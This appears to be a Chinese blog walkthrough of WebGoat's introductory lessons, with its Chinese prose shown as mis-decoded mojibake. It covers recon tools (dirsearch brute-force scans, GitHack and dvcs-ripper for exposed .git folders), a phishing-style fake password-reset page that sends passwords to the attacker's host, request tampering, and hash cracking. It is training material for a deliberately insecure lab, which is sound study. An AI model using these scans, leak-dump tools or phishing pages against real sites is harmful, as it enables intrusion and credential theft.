<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/7.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/8.png" alt=""></p>
<h3 id="3-F12">3.F12</h3>
<p>æµè§ˆå™¨ f12 è‡ªå¸¦çš„å¼€å‘è€…æ¨¡å¼,æœ‰å…³åœ¨å®¢æˆ·ç«¯æ–¹é¢çš„å¾ˆå¤šéƒ½ç”¨å¼€å‘è€…æ¨¡å¼è§£å†³</p>
<h3 id="4-dirsearch">4.dirsearch</h3>
<p>dirsearch æ˜¯ä¸€ä¸ªåŸºäº python çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œç”¨äºæ¢æµ‹ WEB æœåŠ¡å™¨ä¸‹çš„****æ•æ„Ÿæ–‡ä»¶/ç›®å½•****çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨å‘½ä»¤</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx //æ—¥å¸¸ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r //é€’å½’æ‰«æï¼Œä¸è¿‡å®¹æ˜“è¢«æ£€æµ‹</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 //çº¿ç¨‹æ§åˆ¶è¯·æ±‚é€Ÿç‡</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080 //ä½¿ç”¨ä»£ç†</span><br></pre></td></tr></table></figure>
<p>ä¸‹è½½æ•™ç¨‹åŠè¯´æ˜ ğŸ‘‰<a target="_blank" rel="noopener" href="https://www.nonevector.top/posts/18.html">ç‚¹å‡»ç›´è¾¾</a></p>
<p>ps:ç½‘ä¸Šä¸€å¤§å¨æ•™ç¨‹æˆ‘æ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°æœ‰ç”¨çš„ ğŸ˜­</p>
<h3 id="5-GitHack">5.GitHack</h3>
<p>GitHack is a .git folder disclosure exploit.</p>
<p>It rebuild source code from .git folder while keep directory structure unchanged.</p>
<p>GitHack æ˜¯ä¸€ä¸ª.git æ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„.git æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ã€‚</p>
<p>æ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å®¡è®¡ä»£ç ï¼ŒæŒ–æ˜ï¼šæ–‡ä»¶ä¸Šä¼ ï¼ŒSQL æ³¨å°„ç­‰ web å®‰å…¨æ¼æ´ã€‚</p>
<p>ä¸‹è½½éœ€è¦ä½¿ç”¨ git å‘½ä»¤</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/242540359">windows ä¸‹è½½ git</a></p>
<p>linux ç³»ç»Ÿä¸‹è½½ git ä½¿ç”¨å‘½ä»¤è¡Œ<code>yum install git</code></p>
<p>ç„¶ååœ¨è‡ªå·±æƒ³è¦çš„æ–‡ä»¶ä½ç½®ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure>
<p>å€¼å¾—ä¸€æçš„æ˜¯ GitHack åªèƒ½åœ¨ Python2 çš„ç¯å¢ƒä¸‹è¿è¡Œ</p>
<h3 id="6-dvcs-ripper">6.dvcs-ripper</h3>
<p>æ³„éœ²æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œåœ¨ linux é‡Œé¢ä½¿ç”¨ï¼ˆå¯ä»¥æ‰¾.svnï¼Œ.hg ç­‰ç­‰ï¼‰</p>
<p>ä½¿ç”¨ git ä¸‹è½½</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure>
<p>ç„¶åä½¿ç”¨å‘½ä»¤ä¸‹è½½éœ€è¦ç»„ä»¶</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure>
<p>å³å¯</p>
<h3 id="7-password">7.password</h3>
<p>å­—å…¸éœ€è¦å‡†å¤‡å¥½ï¼Œç”¨äºçˆ†ç ´</p>
<h3 id="8-ç¼–ç -è§£ç å·¥å…·">8.ç¼–ç /è§£ç å·¥å…·</h3>
<p>æˆ‘ä¸ªäººç”¨çš„æ˜¯</p>
<p><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode"> åœ¨çº¿å·¥å…· </a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/">atoolbox</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5åœ¨çº¿è§£å¯†ç ´è§£</a>ï¼ˆç”¨äºhashï¼‰</p>
<p>å½“ç„¶è¿™ä¸ªè‡ªå·±éšä¾¿è‡ªå·±æ‰¾ä¸€ä¸ªå°±è¡Œ</p>
<h2 id="1-Introduction">1.Introduction</h2>
<h3 id="1-WebGoat">1.WebGoat</h3>
<blockquote>
<p>WebGoat is a deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications that use common and popular open source components.</p>
<p>Now, while we in no way condone causing intentional harm to any animal, goat or otherwise, we think learning everything you can about security vulnerabilities is essential to understanding just what happens when even a small bit of unintended code gets into your applications.</p>
<p>What better way to do that than with your very own scapegoat?</p>
<p>Feel free to do what you will with him. Hack, poke, prod and if it makes you feel better, scare him until your heartâ€™s content. Go ahead, and hack the goat. We promise he likes it.</p>
<p>Thanks for your interest!</p>
<p>The WebGoat Team</p>
<p>æœºç¿»ï¼š</p>
<p>WebGoatæ˜¯ä¸€ä¸ªæ•…æ„ä¸å®‰å…¨çš„åº”ç”¨ç¨‹åºï¼Œå®ƒå…è®¸åƒæ‚¨ä¸€æ ·æ„Ÿå…´è¶£çš„å¼€å‘äººå‘˜æµ‹è¯•åœ¨ä½¿ç”¨å¸¸è§å’Œæµè¡Œçš„å¼€æºç»„ä»¶çš„åŸºäºjavaçš„åº”ç”¨ç¨‹åºä¸­å¸¸è§çš„æ¼æ´ã€‚</p>
<p>ç°åœ¨ï¼Œè™½ç„¶æˆ‘ä»¬ç»ä¸å®¹å¿å¯¹ä»»ä½•åŠ¨ç‰©ã€å±±ç¾Šæˆ–å…¶ä»–åŠ¨ç‰©é€ æˆæ•…æ„ä¼¤å®³ï¼Œä½†æˆ‘ä»¬è®¤ä¸ºï¼Œäº†è§£æœ‰å…³å®‰å…¨æ¼æ´çš„ä¸€åˆ‡çŸ¥è¯†å¯¹äºç†è§£å³ä½¿æ˜¯ä¸€å°éƒ¨åˆ†æ„å¤–ä»£ç è¿›å…¥åº”ç”¨ç¨‹åºæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p>è¿˜æœ‰ä»€ä¹ˆæ¯”æ‰¾ä½ è‡ªå·±çš„æ›¿ç½ªç¾Šæ›´å¥½çš„åŠæ³•å—?</p>
<p>éšä½ æ€ä¹ˆå¤„ç½®ä»–ã€‚ç å•Šï¼Œæˆ³å•Šï¼Œæˆ³å•Šï¼Œå¦‚æœèƒ½è®©ä½ æ„Ÿè§‰å¥½ç‚¹ï¼Œå°±æŠŠä»–å“ä¸ªåŠæ­»ã€‚æ¥å§ï¼Œç å±±ç¾Šã€‚æˆ‘ä»¬ä¿è¯ä»–ä¼šå–œæ¬¢çš„ã€‚</p>
<p>è°¢è°¢ä½ çš„å…³æ³¨!</p>
<p>WebGoatå›¢é˜Ÿ</p>
</blockquote>
<h3 id="2-WebWolf">2.WebWolf</h3>
<h4 id="1-Introducing-WebWolf">1.Introducing WebWolf</h4>
<blockquote>
<p>åªæœ‰å½“è¯¾ç¨‹æŒ‡å®šæ‚¨å¯ä»¥ä½¿ç”¨ WebWolf æ—¶(ä¸€èˆ¬å³ä¸‹è§’ä¼šæœ‰ä¸€å¤´ç‹¼çš„å›¾æ ‡ï¼Œæ‚¨æ‰éœ€è¦å®ƒã€‚å¯¹äºå¾ˆå¤šè¯¾ç¨‹ï¼Œæ‚¨ä½¿ç”¨ WebGoat è€Œä¸ä½¿ç”¨ å¯åŠ¨ WebWolfã€‚å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨ WebWolf è¿›è¡Œç»ƒä¹ ï¼Œè¯·ç¡®ä¿å®ƒä¸ WebGoat ä¸€èµ·è¿è¡Œã€‚</p>
<p>æ‚¨ä¹Ÿæ²¡æœ‰ä¹‰åŠ¡ä½¿ç”¨ WebWolfï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨æ‚¨å–œæ¬¢çš„ä»»ä½•æ‹¦æˆªå·¥å…·</p>
</blockquote>
<h4 id="2-Uploading-files">2.Uploading files</h4>
<p>æ•™å¯¼å¦‚ä½•ä¸Šä¼ æ–‡ä»¶</p>
<h4 id="3-Your-own-mailbox">3.Your own mailbox</h4>
<p>WebWolfæä¾›é‚®ç®±å®¢æˆ·ç«¯</p>
<p>éšä¾¿è¾“å…¥ä»€ä¹ˆéƒ½ä¼šåœ¨è¿”å›ä¸€å°é‚®ä»¶</p>
<p>æ‰“å¼€é‚®ä»¶åä¼šæœ‰flagï¼Œè¾“å…¥å°±è¡Œï¼ˆå…¶å®å°±æ˜¯ä½ çš„ç”¨æˆ·ååè¿‡æ¥ï¼‰</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/2.png" alt="1"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/1.png" alt="1"></p>
<h4 id="4-Landing-page">4.Landing page</h4>
<blockquote>
<p>Suppose we tricked a user to click on a link he/she received in an email, this link will open up our crafted password reset link page. The user does not notice any differences compared to the normal password reset page of the company. The user enters a new password and hits enter. The new password will be sent to your host. In this case the new password will be sent to WebWolf. Try to locate the unique code.</p>
<p>Please be aware that after resetting the password the user will receive an error page. In a real attack scenario the user would probably see a normal success page (this is due to a limit what we can control with WebWolf)</p>
<p>å‡è®¾æˆ‘ä»¬è¯±éª—ç”¨æˆ·ç‚¹å‡»ä»–/å¥¹åœ¨ç”µå­é‚®ä»¶ä¸­æ”¶åˆ°çš„é“¾æ¥ï¼Œæ­¤é“¾æ¥å°†æ‰“å¼€æˆ‘ä»¬ç²¾å¿ƒåˆ¶ä½œçš„é“¾æ¥ å¯†ç é‡ç½®é“¾æ¥é¡µé¢ã€‚ä¸å…¬å¸çš„æ­£å¸¸å¯†ç é‡ç½®é¡µé¢ç›¸æ¯”ï¼Œç”¨æˆ·æ²¡æœ‰æ³¨æ„åˆ°ä»»ä½•å·®å¼‚ã€‚ ç”¨æˆ·è¾“å…¥æ–°å¯†ç å¹¶æŒ‰å›è½¦é”®ã€‚æ–°å¯†ç å°†å‘é€ç»™æ‚¨çš„ä¸»æœºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ–°çš„ å¯†ç å°†å‘é€åˆ° WebWolfã€‚å°è¯•æ‰¾åˆ°å”¯ä¸€ä»£ç ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œé‡ç½®å¯†ç åï¼Œç”¨æˆ·å°†æ”¶åˆ°ä¸€ä¸ªé”™è¯¯é¡µé¢ã€‚åœ¨å®é™…æ”»å‡»åœºæ™¯ä¸­ï¼Œ ç”¨æˆ·å¯èƒ½ä¼šçœ‹åˆ°ä¸€ä¸ªæ­£å¸¸çš„æˆåŠŸé¡µé¢ï¼ˆè¿™æ˜¯ç”±äºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ WebWolf æ§åˆ¶çš„é™åˆ¶ï¼‰</p>
</blockquote>
<p>ç‚¹å‡»è“è‰²çš„é“¾æ¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/3.png" alt="3"></p>
<p>éšä¾¿è¾“å…¥å¯†ç </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/4.png" alt="4"></p>
<p>å¯†ç ä¼šå‡ºç°åœ¨urlä¸­ä»¥åŠflag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/5.png" alt="5"></p>
<h2 id="2-General">2.General</h2>
<h3 id="1-HTTP-Basics">1.HTTP Basics</h3>
<p>è¿™ä¸€éƒ¨åˆ†ä»‹ç»äº†httpçš„GETæ–¹æ³•å’ŒPOSTæ–¹æ³•çš„åŒºåˆ«ï¼Œç®€å•åŒºåˆ†å°±æ˜¯GETæ–¹æ³•çš„å‚æ•°ç›´æ¥é€šè¿‡urlä¼ é€’ï¼ŒPOSTçš„å‚æ•°åˆ™é€šè¿‡åŒ…æ¥ä¼ é€’ã€‚</p>
<h4 id="2">2</h4>
<p>è¯¥é¢˜çœ‹ä¸€ä¸‹ç¿»è¯‘å«æˆ‘ä»¬è¾“å…¥åå­—å°±è¡Œäº†ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<h4 id="3">3</h4>
<p>è¿™é¢˜é—®ä¸Šé¢˜httpçš„methonæ˜¯GETè¿˜æ˜¯POSTï¼Œurlæ²¡å˜å°±æ˜¯POST</p>
<p>ç„¶åé—®æˆ‘ä»¬magic number ï¼Œè¿™é‡Œå°±éœ€è¦æŠ“åŒ…äº†</p>
<p>æ‰“å¼€burpå¼€å¯æ‹¦æˆªï¼ˆæ²¡æ‰¾åˆ°å°±Forwardï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹ï¼‰å°±èƒ½æ‰¾åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/6.png" alt="6"></p>
<h3 id="2-HTTP-Proxies">2.HTTP Proxies</h3>
<p>è¿™é‡Œä¸»è¦ä»‹ç»çš„æ˜¯ZAPä»£ç†å·¥å…·ï¼Œå› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯burpï¼Œæ‰€ä»¥ä¸åœ¨ä»‹ç»ZAPï¼Œæœ‰å…´è¶£è‡ªè¡Œå­¦ä¹ ï¼Œæˆ‘ä»¬ç›´æ¥è·³åˆ°ç¬¬6é¢˜</p>
<h4 id="6">6</h4>
<p>è¿™é¢˜æ˜¯è¦ä½ ä¿®æ”¹è¯·æ±‚åŒ…</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Change the Method to GET </span><br><span class="line">2.Add a header &#x27;x-request-intercepted:true&#x27;</span><br><span class="line">3.Remove the request body and instead send &#x27;changeMe&#x27; as query string parameter and set the value to &#x27;Requests are tampered easily&#x27; (without the single quotes)</span><br><span class="line"></span><br><span class="line">æŠŠPOSTæ”¹æˆGETï¼Œæ·»åŠ å¤´éƒ¨x-request-intercepted:trueï¼ŒæŠŠchangeMeçš„å­—ç¬¦ä¸²æ”¹æˆRequests are tampered easily</span><br></pre></td></tr></table></figure>
<p>ï¼ˆä¸‹å›¾æœªä¿®æ”¹ï¼Œä¿®æ”¹ä»…ä»…æ˜¯æ·»åŠ å’Œä¿®æ”¹ï¼Œå›¾ç‰‡å¿˜è®°ä¿å­˜äº†ï¼Œä¸æ˜¯å¾ˆéš¾å°±ç®—äº† <s>æ‡’</s>ï¼‰</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/9.png" alt="9"></p>
<h3 id="3-Developer-Tools">3.Developer Tools</h3>
<p>è¿™é‡Œä»‹ç»çš„æ˜¯å¼€å‘è€…å·¥å…·ï¼Œä¹Ÿå°±æ˜¯F12ï¼Œè€æ ·å­æˆ‘ä»¬ç›´æ¥è·³åˆ°ç¬¬4é¢˜å’Œç¬¬6é¢˜</p>
<h4 id="4">4</h4>
<p>æŒ‰ç…§é¢˜æ„å«æˆ‘ä»¬ä½¿ç”¨ ``webgoat.customjs.phoneHome()`å‡½æ•°å°±è¡Œäº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/10.png" alt="10"></p>
<h4 id="6-2">6</h4>
<p>è¿™é¢˜æ˜¯è¦æˆ‘ä»¬è§‚å¯Ÿå‘é€çš„è¯·æ±‚åŒ…ï¼ˆç‚¹å‡»goï¼‰</p>
<p>ç„¶åå»ç½‘ç»œçš„é€‰é¡¹æ‰¾networkçš„åŒ…</p>
<p>è¯·æ±‚é‡Œé¢æœ‰networkNum</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/11.png" alt="11"></p>
<h3 id="4-CIA-Triad">4.CIA Triad</h3>
<blockquote>
<p>The CIA Triad (confidentiality, integrity, availability) is a model for information security. The three elements of the triad are considered the most crucial information security components and should be guaranteed in any secure system.</p>
<p>CIAï¼ˆä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ï¼‰æ˜¯ä¿¡æ¯å®‰å…¨çš„å…¸èŒƒã€‚ ä¸‰åˆä¼šçš„ä¸‰ä¸ªè¦ç´ è¢«è®¤ä¸ºæ˜¯æœ€å…³é”®çš„ä¿¡æ¯å®‰å…¨ç»„ä»¶ï¼Œåœ¨ä»»ä½•å®‰å…¨ç³»ç»Ÿä¸­éƒ½åº”è¯¥å¾—åˆ°ä¿è¯</p>
</blockquote>
<h4 id="5">5</h4>
<p>è¿™é¢˜ä¸å¥½åšè§£é‡Šï¼Œæˆ‘å°±æ”¾å‡ºç­”æ¡ˆå§</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/12.png" alt="12"></p>
<h3 id="5-Crypto-Basics">5.Crypto Basics</h3>
<blockquote>
<p>This lesson explains different types of cryptography techniques that are commonly used in web applications.</p>
<p>æœ¬ èŠ‚ è¯¾ ä»‹ç» äº† Web åº”ç”¨ç¨‹åºä¸­ å¸¸ç”¨ çš„ ä¸åŒ ç±»å‹ çš„ åŠ å¯† æŠ€æœ¯ã€‚</p>
</blockquote>
<h4 id="2-Base64-Encoding">2.Base64 Encoding</h4>
<p>éšä¾¿æ‰¾ä¸ªbase64è§£å¯†ç½‘ç«™å°±è¡Œäº†ï¼ˆæˆ‘ä¸Šé¢å·¥å…·æœ‰ï¼‰</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/13.png" alt="13">****</p>
<h4 id="3-Other-Encoding">3.Other Encoding</h4>
<p>è¿™é‡Œä»‹ç»çš„å…¶å®æ˜¯IBM WebSphere Application Server ä½¿ç”¨ç‰¹å®šçš„ XOR ç¼–ç å®ç°å°†å¯†ç å­˜å‚¨åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œç”¨WebSphereè§£å¯†æ‰è¡Œ</p>
<p><a target="_blank" rel="noopener" href="https://www.sysman.nl/wasdecoder/">WebSphere Password Decoder (sysman.nl)</a></p>
<p>ç­”æ¡ˆè¿™ä¸ªæ˜¯æˆ‘ä¸Šç½‘æœçš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/14.png" alt="13"></p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„æ²¡æœ‰ç”¨ï¼Œ503äº†ã€‚ã€‚ã€‚ä¼°è®¡æ˜¯å¯¹é¢æœåŠ¡å™¨çš„é—®é¢˜</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/15.png" alt="15"></p>
<p>ä¸‹é¢å†ç»™ä¸ªè¦ç¿»å¢™çš„ç½‘ç«™ï¼Œè¿™ä¸ªæˆ‘æµ‹è¯•äº†æ²¡æœ‰é—®é¢˜</p>
<p><a target="_blank" rel="noopener" href="https://strelitzia.net/wasXORdecoder/wasXORdecoder.html">strelitzia.net</a></p>
<h4 id="4-Hashing">4.Hashing</h4>
<p>è¿™é¢˜çš„æ„æ€æ˜¯è¦ä½ ç°æ ¹æ®ä¸‹é¢æ•£åˆ—å€¼çš„é•¿åº¦åˆ¤æ–­æ˜¯å“ªç§hashç®—æ³•ï¼Œå†è§£å¯†</p>
<p>ä½†æ˜¯æˆ‘ä»¬ç”¨åˆé€‚çš„å·¥å…·å°±è¡Œäº†</p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5åœ¨çº¿è§£å¯†ç ´è§£</a></p>
<p>è¾“å…¥ç›´æ¥è§£å¯†å°±è¡Œäº†</p>
<h4 id="5-2">5.</h4>
<p>è¿™é¢˜å†æˆ‘ä¸æ–­åœ°çœ‹æç¤ºå’Œç½‘ä¸Šå¤§ä½¬çš„writeupåçŸ¥é“äº†è¦å¹²ä»€ä¹ˆï¼ˆéœ€è¦ä½¿ç”¨kaliçš„opensslåŠŸèƒ½ï¼Œä¸»è¦æ˜¯æ–¹ä¾¿ï¼Œåœ¨å…¶ä»–åœ°æ–¹è‡ªè¡Œä¸‹è½½opensslçš„åŒ…ä¹Ÿè¡Œï¼‰</p>
<p>é¦–å…ˆä»–ç»™äº†ä¸€ä¸ªRSAå¯†é’¥ï¼Œè¦æˆ‘ä»¬å…ˆç”¨å¯†é’¥æ±‚å…¬é’¥ï¼Œç„¶åç”¨å…¬é’¥å–æ¨¡ï¼ˆç¬¬ä¸€ç©ºï¼‰ï¼Œå†ç”¨sha256ç­¾åï¼Œå†ç”¨base64åŠ å¯†</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl rsa: è¿™æ˜¯opensslå·¥å…·çš„ä¸€ä¸ªå­å‘½ä»¤ï¼Œç”¨äºå¤„ç†RSAå¯†é’¥ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.key: è¿™æŒ‡å®šäº†è¾“å…¥æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç§é’¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç§é’¥å­˜å‚¨åœ¨åä¸ºtest.keyçš„æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubout: è¿™æ˜¯ä¸€ä¸ªæ ‡å¿—ï¼Œè¡¨ç¤ºè¦è¾“å‡ºå…¬é’¥ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&gt; test.pub: è¿™å°†è¾“å‡ºé‡å®šå‘åˆ°åä¸ºtest.pubçš„æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-<span class="keyword">in</span> test.pub: è¿™æŒ‡å®šäº†è¾“å…¥æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å…¬é’¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå…¬é’¥å­˜å‚¨åœ¨åä¸ºtest.pubçš„æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pubin: è¿™æ˜¯ä¸€ä¸ªæ ‡å¿—ï¼Œè¡¨ç¤ºè¾“å…¥æ–‡ä»¶åŒ…å«çš„æ˜¯å…¬é’¥ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-modulus: è¿™æ˜¯ä¸€ä¸ªæ ‡å¿—ï¼Œè¡¨ç¤ºè¦è¾“å‡ºæ¨¡æ•°ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-noout: è¿™æ˜¯ä¸€ä¸ªæ ‡å¿—ï¼Œè¡¨ç¤ºä¸è¾“å‡ºå¯†é’¥æœ¬èº«ï¼Œåªè¾“å‡ºæ¨¡æ•°ã€‚</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åœ¨<span class="built_in">echo</span>å‘½ä»¤ä¸­ï¼Œ-né€‰é¡¹ç”¨äºæŠ‘åˆ¶è‡ªåŠ¨æ·»åŠ çš„æ¢è¡Œç¬¦ã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">openssl dgst -sign key -sha256 | <span class="built_in">base64</span> ä½¿ç”¨opensslçš„dgstå‘½ä»¤ï¼ˆæ•°æ®æ‘˜è¦å’Œå“ˆå¸Œå·¥å…·ï¼‰å¯¹è¾“å…¥è¿›è¡Œç­¾åã€‚è¿™é‡Œä½¿ç”¨SHA-256å“ˆå¸Œå‡½æ•°å’Œä¸€ä¸ªç§é’¥test.keyè¿›è¡Œç­¾åï¼Œå¹¶å°†ç»“æœç”¨<span class="built_in">base64</span>åŠ å¯†</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1.ç”Ÿæˆå…¬é’¥</span></span><br><span class="line">openssl rsa -in test.key -pubout &gt; test.pub </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2.è·å¾—æ¨¡</span></span><br><span class="line">openssl rsa -in test.pub -pubin -modulus -noout</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3.ç”¨sha256ç­¾åï¼Œå†ç”¨<span class="built_in">base64</span>åŠ å¯†</span></span><br><span class="line">echo -n &quot;***&quot; | openssl dgst -sign key -sha256 | base64</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/17.png" alt="17"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/18.png" alt="18"></p>
